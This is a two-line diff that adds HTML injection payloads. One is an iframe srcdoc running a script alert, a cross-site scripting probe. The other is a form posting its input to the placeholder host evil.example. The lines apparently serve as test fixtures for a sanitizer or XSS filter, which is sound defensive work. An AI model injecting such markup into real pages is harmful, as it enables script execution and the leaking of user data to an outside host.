@@ -1,0 +1,2 @@
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<form action="https://evil.example/"><input name=a></form>
